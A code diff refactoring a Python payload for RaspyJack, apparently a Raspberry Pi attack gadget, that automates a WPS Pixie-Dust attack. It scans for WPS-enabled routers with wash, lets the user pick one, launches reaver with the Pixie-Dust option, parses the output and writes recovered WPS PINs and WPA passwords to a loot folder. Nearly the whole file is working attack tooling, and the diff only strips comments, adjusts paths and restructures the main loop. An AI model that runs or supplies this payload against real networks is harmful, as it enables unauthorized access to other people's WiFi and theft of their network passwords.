@@ -1,43 +1,23 @@
 #!/usr/bin/env python3
 import sys
-sys.path.append('/root/Raspyjack/')
-"""
-RaspyJack *payload* – **WPS Pixie-Dust Attack**
-================================================
-An advanced WiFi payload that uses Reaver and PixieWPS to attack WiFi
-Protected Setup (WPS) in order to recover the WPA PSK. This attack
-is effective against many routers with vulnerable WPS implementations.
-
-Features:
-1.  Uses `wash` to scan for WPS-enabled, non-locked access points.
-2.  Provides a UI to select a target from the scan results.
-3.  Launches `reaver` with the Pixie-Dust (`-K 1`) option.
-4.  Parses reaver's output to display the attack status in real-time.
-5.  Displays the recovered WPA PSK and WPS PIN if the attack is successful.
-6.  Saves successful cracks to a loot file.
-"""
-
-# ---------------------------------------------------------------------------
-# 0) Imports & boilerplate
-# ---------------------------------------------------------------------------
-import os, sys, subprocess, signal, time, re, threading
-
-# ---------------------------- Third‑party libs ----------------------------
+import os
+import time
+import signal
+import subprocess
+import re
+import threading
+sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
+from wifi.raspyjack_integration import get_available_interfaces
+from wifi.wifi_manager import WiFiManager
 
-# ---------------------------------------------------------------------------
-# 1) GPIO mapping (BCM)
-# ---------------------------------------------------------------------------
 PINS: dict[str, int] = {
     "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
     "KEY1": 21, "KEY2": 20, "KEY3": 16,
 }
 
-# ---------------------------------------------------------------------------
-# 2) GPIO & LCD initialisation
-# ---------------------------------------------------------------------------
 GPIO.setmode(GPIO.BCM)
 for pin in PINS.values():
     GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
@@ -48,32 +28,16 @@ WIDTH, HEIGHT = 128, 128
 FONT = ImageFont.load_default()
 FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
 
-# ---------------------------------------------------------------------------
-# 3) Global State & Configuration
-# ---------------------------------------------------------------------------
-try:
-    sys.path.append('/root/Raspyjack/wifi/')
-    from wifi.raspyjack_integration import get_available_interfaces
-    from wifi.wifi_manager import WiFiManager
-    WIFI_INTEGRATION = True
-    wifi_manager = WiFiManager()
-    print("✅ WiFi integration loaded - dynamic interface support enabled")
-except ImportError as e:
-    print(f"⚠️  WiFi integration not available: {e}")
-    WIFI_INTEGRATION = False
-    wifi_manager = None # Ensure wifi_manager is None if import fails
-
-WIFI_INTERFACE = None # Will be set by user selection
-ORIGINAL_WIFI_INTERFACE = None # Added to store original interface name
-LOOT_DIR = "/root/Raspyjack/loot/WPS_Pixie/"
+WIFI_INTERFACE = None
+ORIGINAL_WIFI_INTERFACE = None
+RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
+LOOT_DIR = os.path.join(RASPYJACK_DIR, "loot", "WPS_Pixie")
 running = True
 attack_process = None
 status_lines = ["Waiting to start..."]
 ui_lock = threading.Lock()
+wifi_manager = WiFiManager()
 
-# ---------------------------------------------------------------------------
-# 4) Graceful shutdown
-# ---------------------------------------------------------------------------
 def cleanup(*_):
     global running, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
     if running:
@@ -84,7 +48,6 @@ def cleanup(*_):
             except ProcessLookupError:
                 pass
     
-    # Deactivate monitor mode on cleanup
     if WIFI_INTERFACE and wifi_manager and ORIGINAL_WIFI_INTERFACE:
         print(f"Deactivating monitor mode on {WIFI_INTERFACE} and restoring {ORIGINAL_WIFI_INTERFACE}...")
         wifi_manager.deactivate_monitor_mode(WIFI_INTERFACE)
@@ -92,9 +55,6 @@ def cleanup(*_):
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
 
-# ---------------------------------------------------------------------------
-# 5) UI Functions
-# ---------------------------------------------------------------------------
 def draw_message(message, color="yellow"):
     img = Image.new("RGB", (WIDTH, HEIGHT), "black")
     d = ImageDraw.Draw(img)
@@ -121,7 +81,7 @@ def draw_list_ui(title, items, selected_index):
         y_pos = 25
         for i in range(start_index, end_index):
             color = "yellow" if i == selected_index else "white"
-            line = items[i]['essid'][:16] # Truncate long SSIDs
+            line = items[i]['essid'][:16]
             d.text((5, y_pos), line, font=FONT, fill=color)
             y_pos += 12
             
@@ -143,9 +103,6 @@ def draw_attack_ui():
     d.text((5, 110), "Press KEY3 to Stop", font=FONT, fill="orange")
     LCD.LCD_ShowImage(img, 0, 0)
 
-# ---------------------------------------------------------------------------
-# 6) Core Attack Functions
-# ---------------------------------------------------------------------------
 def draw_ui_interface_selection(interfaces, current_selection):
     img = Image.new("RGB", (128, 128), "black")
     d = ImageDraw.Draw(img)
@@ -164,11 +121,6 @@ def draw_ui_interface_selection(interfaces, current_selection):
 def select_interface_menu():
     global WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE, status_lines
     
-    if not WIFI_INTEGRATION or not wifi_manager:
-        draw_message("WiFi integration not available!", "red")
-        time.sleep(3)
-        return False
-
     available_interfaces = [iface for iface in get_available_interfaces() if iface.startswith('wlan')]
     if not available_interfaces:
         draw_message("No WiFi interfaces found!", "red")
@@ -192,7 +144,7 @@ def select_interface_menu():
             monitor_iface = wifi_manager.activate_monitor_mode(selected_iface)
             if monitor_iface:
                 WIFI_INTERFACE = monitor_iface
-                ORIGINAL_WIFI_INTERFACE = selected_iface # Store original for cleanup
+                ORIGINAL_WIFI_INTERFACE = selected_iface
                 draw_message(f"Monitor mode active\non {WIFI_INTERFACE}", "lime")
                 time.sleep(2)
                 return True
@@ -200,7 +152,7 @@ def select_interface_menu():
                 draw_message(f"Failed to activate\nmonitor mode on {selected_iface}", "red")
                 time.sleep(3)
                 return False
-        elif GPIO.input(PINS["KEY3"]) == 0: # Cancel
+        elif GPIO.input(PINS["KEY3"]) == 0:
             return False
         
         time.sleep(0.1)
@@ -216,9 +168,8 @@ def scan_for_targets():
     draw_message("Scanning with wash...")
     targets = []
     try:
-        # Use -j to get JSON output for easier parsing
         proc = subprocess.Popen(f"wash -i {WIFI_INTERFACE} -j", shell=True, stdout=subprocess.PIPE, text=True)
-        time.sleep(10) # Scan for 10 seconds
+        time.sleep(10)
         proc.terminate()
         
         for line in proc.stdout:
@@ -249,8 +200,8 @@ def run_attack(target):
         "-i", WIFI_INTERFACE,
         "-b", bssid,
         "-c", str(channel),
-        "-K", "1", # The Pixie-Dust attack
-        "-vv" # Very verbose output to parse
+        "-K", "1",
+        "-vv"
     ]
     
     attack_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
@@ -267,8 +218,8 @@ def run_attack(target):
         with ui_lock:
             if "[+]" in line:
                 status_lines = [essid[:16], line.replace("[+]", "").strip()]
-            elif "[!]" in line:
-                status_lines = [essid[:16], "Error:", line.replace("[!]", "").strip()[:20]]
+            elif "[!" in line:
+                status_lines = [essid[:16], "Error:", line.replace("[!", "").strip()[:20]]
             
             if "WPS PIN:" in line:
                 wps_pin = line.split(':')[1].strip().replace("'", "")
@@ -276,7 +227,7 @@ def run_attack(target):
                 wpa_psk = line.split(':')[1].strip().replace("'", "")
 
         if wpa_psk:
-            break # Success!
+            break
 
     if wpa_psk:
         with ui_lock:
@@ -292,73 +243,68 @@ def run_attack(target):
         with ui_lock:
             status_lines = ["Attack failed or", "was stopped."]
 
-# ---------------------------------------------------------------------------
-# 7) Main Loop
-# ---------------------------------------------------------------------------
-try:
-    dep_missing = check_dependencies()
-    if dep_missing:
-        draw_message(f"{dep_missing} not found!", "red")
-        time.sleep(5)
-        raise SystemExit(f"{dep_missing} not found")
+if __name__ == '__main__':
+    try:
+        dep_missing = check_dependencies()
+        if dep_missing:
+            draw_message(f"{dep_missing} not found!", "red")
+            time.sleep(5)
+            raise SystemExit(f"{dep_missing} not found")
 
-    if not select_interface_menu():
-        draw_message("No interface selected\nor monitor mode failed.", "red")
-        time.sleep(3)
-        raise SystemExit("No interface selected or monitor mode failed.")
-
-    # Main menu loop
-    while running:
-        targets = scan_for_targets()
-        
-        if not targets:
-            draw_message("No vulnerable\ntargets found.")
+        if not select_interface_menu():
+            draw_message("No interface selected\nor monitor mode failed.", "red")
             time.sleep(3)
-            continue
+            raise SystemExit("No interface selected or monitor mode failed.")
 
-        selected_index = 0
-        # Target selection loop
         while running:
-            draw_list_ui("Select Target", targets, selected_index)
+            targets = scan_for_targets()
+            
+            if not targets:
+                draw_message("No vulnerable\ntargets found.")
+                time.sleep(3)
+                continue
+
+            selected_index = 0
+            while running:
+                draw_list_ui("Select Target", targets, selected_index)
+                
+                if GPIO.input(PINS["KEY3"]) == 0:
+                    break
+                
+                if GPIO.input(PINS["UP"]) == 0:
+                    selected_index = (selected_index - 1) % len(targets)
+                    time.sleep(0.2)
+                elif GPIO.input(PINS["DOWN"]) == 0:
+                    selected_index = (selected_index + 1) % len(targets)
+                    time.sleep(0.2)
+                elif GPIO.input(PINS["OK"]) == 0:
+                    target = targets[selected_index]
+                    attack_thread = threading.Thread(target=run_attack, args=(target,), daemon=True)
+                    attack_thread.start()
+                    
+                    while attack_thread.is_alive():
+                        draw_attack_ui()
+                        if GPIO.input(PINS["KEY3"]) == 0:
+                            cleanup()
+                            break
+                        time.sleep(1)
+                    
+                    attack_thread.join(timeout=2)
+                    draw_attack_ui()
+                    time.sleep(5)
+                    break
+                
+                time.sleep(0.05)
             
             if GPIO.input(PINS["KEY3"]) == 0:
-                break # Go back to main menu (rescan)
-            
-            if GPIO.input(PINS["UP"]) == 0:
-                selected_index = (selected_index - 1) % len(targets)
-                time.sleep(0.2)
-            elif GPIO.input(PINS["DOWN"]) == 0:
-                selected_index = (selected_index + 1) % len(targets)
-                time.sleep(0.2)
-            elif GPIO.input(PINS["OK"]) == 0:
-                target = targets[selected_index]
-                attack_thread = threading.Thread(target=run_attack, args=(target,), daemon=True)
-                attack_thread.start()
-                
-                # Attack display loop
-                while attack_thread.is_alive():
-                    draw_attack_ui()
-                    if GPIO.input(PINS["KEY3"]) == 0:
-                        cleanup() # Signal thread to stop
-                        break
-                    time.sleep(1)
-                
-                attack_thread.join(timeout=2)
-                draw_attack_ui() # Final status draw
-                time.sleep(5)
-                break # Break to main menu
-            
-            time.sleep(0.05)
-        
-        if GPIO.input(PINS["KEY3"]) == 0:
-            cleanup()
+                cleanup()
 
-except (KeyboardInterrupt, SystemExit):
-    pass
-except Exception as e:
-    print(f"[ERROR] {e}", file=sys.stderr)
-finally:
-    cleanup()
-    LCD.LCD_Clear()
-    GPIO.cleanup()
-    print("WPS Pixie-Dust payload finished.")
+    except (KeyboardInterrupt, SystemExit):
+        pass
+    except Exception as e:
+        print(f"[ERROR] {e}", file=sys.stderr)
+    finally:
+        cleanup()
+        LCD.LCD_Clear()
+        GPIO.cleanup()
+        print("WPS Pixie-Dust payload finished.")
